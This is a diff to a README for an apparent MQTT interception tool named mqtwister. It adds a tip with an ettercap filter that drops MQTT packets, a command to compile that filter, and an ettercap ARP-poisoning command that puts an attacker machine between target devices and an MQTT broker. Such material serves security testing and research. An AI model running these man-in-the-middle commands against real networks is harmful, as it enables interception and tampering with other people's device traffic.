@@ -101,11 +101,48 @@ For added convenience, the files [`Pipfile`](Pipfile) and [`Pipfile.lock`](Pipfi
 
 > [!TIP]
 >
+> To interpose the atacker system between the targets' communications, tools as `ettercap` can be used.
+> <details>
+> <summary>See an example</summary>
+>
+> ___
+> 
+> The following filter logs and drops the received MQTT traffic (assuming the default port, 1883). With this filter, `ettercap` won't forward the MQTT's packets, leaving its processing to `mqtwister`, and keeping the original messages from reaching their destiny without applying changes to the device's operating system or kernel:
+> 
+> ```sh
+> # Filename: mqtt_filter.ecf
+> if (ip.proto == TCP && tcp.src == 1883) {
+>         msg("\nReceived packet with src port 1883.\n");
+>         drop();
+> }
+> if (ip.proto == TCP && tcp.dst == 1883) {
+>         msg("\nReceived packet with dst port 1883.\n");
+>         drop();
+> }
+> ```
+> 
+> It can be compiled with `etterfilter` as follows:
+>
+> ```sh
+> etterfilter mqtt_filter.ecf -o mqtt_filter.ef
+> ```
+> And then it can be used with `ettercap` as shown in the following ARP Poisoning example:
+>
+> ```sh
+> ettercap -T -i eth1 -M arp:remote /$TARGET_IPS// /$BROKER_IP//$MQTT_PORT -F mqtt_filter.ef
+> ```
+> ___
+
+> 
+> </details>
+
+<!-- > [!TIP]
+>
 > There is a useful function in [`mqtwister/utils/network.py`](mqtwister/utils/network.py) to get a list of the available network interfaces: `get_interfaces()`.
 >
 > ```sh
 > python -c "import mqtwister.utils.network as net; print(net.get_interfaces())"
-> ```
+> ``` -->
 
 ## License
 
